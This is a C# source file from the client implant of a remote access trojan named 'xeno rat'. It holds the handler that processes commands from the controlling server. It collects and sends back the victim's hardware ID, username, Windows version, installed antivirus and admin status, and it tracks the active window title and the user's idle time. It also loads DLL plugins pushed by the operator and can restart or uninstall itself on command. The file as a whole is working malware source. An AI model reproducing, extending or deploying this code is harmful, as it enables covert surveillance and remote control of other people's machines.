using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace xeno_rat_client
{
    class Handler
    {
        Node Main;
        DllHandler dllhandler;
        public Handler(Node _Main, DllHandler _dllhandler) 
        {
            dllhandler = _dllhandler;
            Main = _Main;
        }

        /// <summary>
        /// Asynchronously creates a sub socket and performs specific actions based on the socket type.
        /// </summary>
        /// <param name="data">The byte array containing necessary data for creating the sub socket.</param>
        /// <exception cref="IndexOutOfRangeException">Thrown when the data array does not contain the required elements.</exception>
        /// <returns>A task representing the asynchronous operation.</returns>
        /// <remarks>
        /// This method creates a sub socket based on the type and retid extracted from the input data array.
        /// It then connects the sub socket to the main socket asynchronously and sets the parent of the sub socket to the main socket.
        /// After adding the sub socket to the main socket, it checks the type of the sub socket and performs specific actions based on the type.
        /// If the sub socket type is 1, it awaits the Type1Receive method; if it is 2, it awaits the Type2Receive method.
        /// If the sub socket type is neither 1 nor 2, it disconnects the sub socket.
        /// </remarks>
        public async Task CreateSubSock(byte[] data)
        {
            try
            {
                int type = data[1];
                int retid = data[2];
                Node sub = await Main.ConnectSubSockAsync(type, retid, OnDisconnect);
                sub.Parent = Main;
                Main.AddSubNode(sub);
                if (sub.SockType == 1)
                {
                    await Type1Receive(sub);
                }
                else if (sub.SockType == 2)
                {
                    await Type2Receive(sub);
                }
                else
                {
                    if (sub == null) return;
                    sub.Disconnect();
                }
            }
            catch 
            {
                Console.WriteLine("error with subnode, subnode type=" + data[1]);
            }
        }

        /// <summary>
        /// Handles the disconnection of a node.
        /// </summary>
        /// <param name="SubNode">The node being disconnected.</param>
        /// <remarks>
        /// This method is called when a node is being disconnected. It performs the necessary actions to handle the disconnection event for the specified node.
        /// </remarks>
        private void OnDisconnect(Node SubNode) 
        { 
            
        }

        /// <summary>
        /// Asynchronously gets hardware and user information and sends it through the specified node.
        /// </summary>
        /// <param name="Type0">The node to which the information will be sent.</param>
        /// <exception cref="Exception">Thrown when the specified node's SockType is not 0.</exception>
        /// <returns>An asynchronous task representing the sending of the information.</returns>
        /// <remarks>
        /// This method retrieves hardware and user information, including the client version, hardware ID, username, Windows identity, Windows version, antivirus information, and admin status.
        /// The information is sent through the specified node after being encoded and concatenated with null bytes.
        /// </remarks>
        private async Task GetAndSendInfo(Node Type0) 
        {
            if (Type0.SockType != 0) 
            {
                return;
            }
            //get hwid, username etc. seperated by null
            string clientversion = "1.8.7";//find a way to get the client version.
            string[] info = new string[] { Utils.HWID(), Environment.UserName, WindowsIdentity.GetCurrent().Name, clientversion, Utils.GetWindowsVersion(), Utils.GetAntivirus(), Utils.IsAdmin().ToString() };
            byte[] data = new byte[0];
            byte[] nullbyte = new byte[] { 0 };
            for(int i=0;i<info.Length;i++) 
            {
                byte[] byte_data = Encoding.UTF8.GetBytes(info[i]);
                data = SocketHandler.Concat(data, byte_data);
                if (i != info.Length - 1) 
                {
                    data = SocketHandler.Concat(data, nullbyte);
                }
            }
            await Type0.SendAsync(data);
        }

        /// <summary>
        /// Asynchronously receives data and processes it based on the opcode.
        /// </summary>
        /// <remarks>
        /// This method continuously receives data while the main connection is active.
        /// It processes the received data based on the opcode and performs corresponding actions.
        /// The method handles opcodes 0 to 4 and performs actions such as creating a sub-socket, getting and sending information,
        /// killing the current process, restarting the application, and initiating an uninstall process.
        /// </remarks>
        /// <exception cref="InvalidOperationException">Thrown when the main connection is not active.</exception>
        /// <returns>A task representing the asynchronous operation.</returns>
        public async Task Type0Receive()
        {
            while (Main.Connected())
            {
                byte[] data = await Main.ReceiveAsync();
                if (data == null) 
                {
                    break;
                }
                int opcode = data[0];
                switch (opcode)
                {
                    case 0:
                        CreateSubSock(data);
                        break;
                    case 1:
                        await GetAndSendInfo(Main);
                        break;
                    case 2:
                        Process.GetCurrentProcess().Kill();
                        break;
                    case 3:
                        Process.Start(System.Reflection.Assembly.GetEntryAssembly().Location);
                        Process.GetCurrentProcess().Kill();
                        break;
                    case 4:
                        await Utils.Uninstall();
                        break;
                }
            }
            Main.Disconnect();
        }

        /// <summary>
        /// Asynchronously receives and processes data from the specified node.
        /// </summary>
        /// <param name="subServer">The node from which data is to be received.</param>
        /// <remarks>
        /// This method sets a receive timeout of 5000 milliseconds for the <paramref name="subServer"/> and continuously checks for incoming data while both the <paramref name="subServer"/> and the main server are connected.
        /// Upon receiving data, the method processes it and sends a heartbeat reply if the received opcode is 0; otherwise, it sends a heartbeat fail message and breaks the loop.
        /// After processing, the method disconnects both the main server and the <paramref name="subServer"/>.
        /// </remarks>
        public async Task Type1Receive(Node subServer)
        {
            byte[] HearbeatReply = new byte[] { 1 };
            byte[] HearbeatFail = new byte[] { 2 };
            subServer.SetRecvTimeout(5000);
            while (subServer.Connected() && Main.Connected())
            {
                await Task.Delay(1000);
                byte[] data = await subServer.ReceiveAsync();
                if (data == null)
                {
                    break;
                }
                int opcode = data[0];
                if (opcode != 0) 
                {
                    await subServer.SendAsync(HearbeatFail);
                    break;
                }
                await subServer.SendAsync(HearbeatReply);
            }
            Main.Disconnect();
            subServer.Disconnect();
        }

        /// <summary>
        /// Sets the ID of the subServer using the provided data and sends a byte array asynchronously.
        /// </summary>
        /// <param name="subServer">The subServer node whose ID is to be set.</param>
        /// <param name="data">The byte array containing the data to set the ID.</param>
        /// <exception cref="ArgumentNullException">Thrown when the subServer or data is null.</exception>
        /// <returns>A task representing the asynchronous operation.</returns>
        /// <remarks>
        /// This method sets the ID of the subServer using the provided data and then sends a byte array asynchronously.
        /// </remarks>
        private async Task setSetId(Node subServer, byte[] data) 
        {
            byte[] worked = new byte[] { 1 };
            subServer.SetId = subServer.sock.BytesToInt(data, 1);
            await subServer.SendAsync(worked);

        }

        /// <summary>
        /// Asynchronously receives data from the specified node and processes it based on the received opcode.
        /// </summary>
        /// <param name="subServer">The node from which data is received.</param>
        /// <exception cref="Exception">Thrown when an error occurs during the data receiving process.</exception>
        /// <returns>Void.</returns>
        /// <remarks>
        /// This method continuously receives data from the specified node while both the subServer and the main server are connected.
        /// Upon receiving the data, the method checks the opcode to determine the action to be taken.
        /// If the received data is null, the method breaks out of the loop.
        /// The method handles different opcodes by performing various asynchronous tasks such as sending update information, handling DLL nodes, setting IDs, displaying debug menus, and disconnecting the subServer when necessary.
        /// </remarks>
        public async Task Type2Receive(Node subServer)
        {
            while (subServer.Connected() && Main.Connected())
            {
                byte[] data =await subServer.ReceiveAsync();
                if (data == null)
                {
                    break;
                }
                int opcode = data[0];
                switch (opcode)
                {
                    case 0:
                        await SendUpdateInfo(subServer);
                        break;
                    case 1:
                        await dllhandler.DllNodeHandler(subServer);
                        goto outofwhileloop;
                    case 2:
                        await setSetId(subServer,data);
                        break;
                    case 3:
                        return;
                    case 4:
                        await DebugMenu(subServer, data);
                        break;

                }
            }
            outofwhileloop:
            subServer.Disconnect();
        }

        /// <summary>
        /// Handles debug menu operations based on the provided opcode.
        /// </summary>
        /// <param name="subServer">The node representing the sub-server.</param>
        /// <param name="data">The byte array containing the data for the operation.</param>
        /// <returns>A task representing the asynchronous operation.</returns>
        /// <remarks>
        /// This method processes debug menu operations based on the provided opcode.
        /// The opcode determines the specific action to be performed, such as retrieving DLLs, unloading a DLL, or obtaining the console log.
        /// </remarks>
        public async Task DebugMenu(Node subServer, byte[] data) 
        {
            int opcode = data[1];
            switch (opcode) 
            {
                case 0:
                    await subServer.SendAsync(Encoding.UTF8.GetBytes(String.Join("\n", dllhandler.Assemblies.Keys)));
                    break;//get dlls
                case 1:
                    string assm=Encoding.UTF8.GetString(data.Skip(2).ToArray());
                    bool worked = false;
                    if (dllhandler.Assemblies.Keys.Contains(assm)) 
                    {
                        worked=dllhandler.Assemblies.Remove(assm);
                    }

                    await subServer.SendAsync(new byte[] { (byte)(worked ? 1 : 0) });
                    break;//unload dll
                case 2:
                    await subServer.SendAsync(Encoding.UTF8.GetBytes(Program.ProcessLog.ToString()));
                    break;//get console log
            }
        }

        /// <summary>
        /// Asynchronously sends update information to the specified node.
        /// </summary>
        /// <param name="node">The node to which the update information is to be sent.</param>
        /// <exception cref="Exception">Thrown when an error occurs during the update information sending process.</exception>
        /// <returns>A task representing the asynchronous operation.</returns>
        /// <remarks>
        /// This method retrieves the caption of the active window using the <see cref="Utils.GetCaptionOfActiveWindowAsync"/> method and the idle time using the <see cref="Utils.GetIdleTimeAsync"/> method.
        /// It then constructs an update data string containing the current window caption and idle time, converts it to UTF-8 encoded byte array, and sends it to the specified node using the <see cref="Node.SendAsync"/> method.
        /// </remarks>
        public async Task SendUpdateInfo(Node node) 
        {
            string currwin = await Utils.GetCaptionOfActiveWindowAsync();
            string idleTime = ((await Utils.GetIdleTimeAsync()) /1000).ToString();
            string update_data = currwin + "\n" + idleTime;
            byte[] data=Encoding.UTF8.GetBytes(update_data);
            await node.SendAsync(data);
        }

    }
}
